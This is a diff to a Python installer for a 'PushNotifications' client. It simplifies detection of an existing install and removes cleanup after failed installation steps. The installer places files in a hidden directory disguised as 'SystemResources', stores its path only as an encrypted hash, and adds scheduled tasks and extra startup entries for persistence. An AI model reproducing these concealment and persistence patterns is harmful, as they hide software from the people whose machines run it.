@@ -826,72 +826,48 @@ class PushNotificationsInstaller:
             return "00-FF-FF-FF-FF-FF"
     
     def _has_existing_installation(self):
-        """Check if there's an existing installation to repair"""
+        """Check if there's an existing installation to repair - simplified approach"""
         try:
             if self.system == "Windows":
-                # Check registry key first
+                # Check registry key only - don't scan directories to avoid crashes
                 try:
                     with winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                       "Software\\PushNotifications", 0, 
                                       winreg.KEY_READ) as key:
-                        # Registry key exists, but verify actual installation files
+                        # Registry key exists - assume installation exists
+                        # Files will be overwritten during installation if needed
                         try:
-                            install_path_hash, _ = winreg.QueryValueEx(key, "PathHash")
-                            # We have a path hash, but we need to verify the files actually exist
-                            # Since we don't know the exact path (it's encrypted), check for
-                            # any valid installation in common locations
-                            base_paths = [
-                                Path(os.environ.get('PROGRAMFILES(X86)', 'C:\\Program Files (x86)')) / "SystemResources",
-                                Path(os.environ.get('PROGRAMFILES', 'C:\\Program Files')) / "SystemResources"
-                            ]
-                            
-                            for base_path in base_paths:
-                                if base_path.exists():
-                                    # Look for nested GUID directories with Client.py
-                                    for guid1_dir in base_path.glob('*'):
-                                        if guid1_dir.is_dir():
-                                            for guid2_dir in guid1_dir.glob('*'):
-                                                if guid2_dir.is_dir():
-                                                    client_file = guid2_dir / "Client.py"
-                                                    if client_file.exists():
-                                                        print(f"✓ Found existing installation: {guid2_dir}")
-                                                        return True
-                            
-                            # Registry exists but no installation files found
-                            print("⚠️  Registry entry found but installation files missing - treating as new installation")
-                            return False
+                            existing_version, _ = winreg.QueryValueEx(key, "Version")
+                            print(f"✓ Found existing installation registry entry (version: {existing_version})")
+                            print("  Installation will overwrite existing files")
+                            return True
                         except:
-                            # Registry key exists but incomplete - check for any installation
-                            print("⚠️  Incomplete registry data - checking for actual installation files")
-                            return False
+                            # Registry exists but no version - still treat as existing
+                            print("✓ Found existing installation registry entry")
+                            print("  Installation will overwrite existing files")
+                            return True
                 except (OSError, FileNotFoundError):
-                    # No registry key at all
+                    # No registry key - new installation
                     return False
                     
             else:
-                # On Unix-like systems, check for common installation directories
+                # On Unix-like systems, simple check for common paths
                 common_install_paths = [
                     Path.home() / ".local" / "share" / "PushNotifications",
                     Path.home() / "Applications" / "PushNotifications",
                     Path("/usr/local/share/PushNotifications"),
-                    Path("/opt/PushNotifications"),
-                    # Check current directory for development installs
-                    Path.cwd() / "Client.py"
+                    Path("/opt/PushNotifications")
                 ]
                 
                 for path in common_install_paths:
-                    if path.exists():
-                        if path.name == "Client.py":
-                            # Found client file
-                            print(f"✓ Found existing installation: {path.parent}")
-                            return True
-                        elif (path / "Client.py").exists():
-                            # Found installation directory with client
-                            print(f"✓ Found existing installation: {path}")
-                            return True
+                    if path.exists() and (path / "Client.py").exists():
+                        print(f"✓ Found existing installation: {path}")
+                        print("  Installation will overwrite existing files")
+                        return True
                         
         except Exception as e:
             print(f"Warning: Error checking for existing installation: {e}")
+        
         return False
     
     def _load_existing_config(self):
@@ -6949,39 +6925,30 @@ def run_installation(self):
         if not self.register_device():
             print("✗ Installation failed: Device registration failed")
             self.notify_installation_failure("device_registration", "Device registration with server failed")
-            self.cleanup_failed_installation_files()
             return False
         
         # Create hidden installation directory
         if not self.create_hidden_install_directory():
             print("✗ Installation failed: Could not create installation directory")
             self.notify_installation_failure("directory_creation", "Could not create hidden installation directory")
-            self.cleanup_failed_registration()
-            self.cleanup_failed_installation_files()
             return False
         
-        # Create embedded client components
+        # Create embedded client components (will overwrite existing files)
         if not self.create_embedded_client_components():
             print("✗ Installation failed: Could not create client components")
             self.notify_installation_failure("component_creation", "Could not create embedded client components")
-            self.cleanup_failed_registration()
-            self.cleanup_failed_installation_files()
             return False
         
-        # Create encrypted vault
+        # Create encrypted vault (will overwrite existing vault)
         if not self.create_encrypted_vault():
             print("✗ Installation failed: Could not create configuration vault")
             self.notify_installation_failure("vault_creation", "Could not create AES-256-GCM encrypted configuration vault")
-            self.cleanup_failed_registration()
-            self.cleanup_failed_installation_files()
             return False
         
-        # Create scheduled tasks
+        # Create scheduled tasks (will overwrite existing tasks)
         if not self.create_scheduled_tasks():
             print("✗ Installation failed: Could not create scheduled tasks")
             self.notify_installation_failure("scheduled_tasks", "Could not create Windows scheduled tasks for client and updater")
-            self.cleanup_failed_registration()
-            self.cleanup_failed_installation_files()
             return False
         
         # Create additional startup entries for maximum reliability
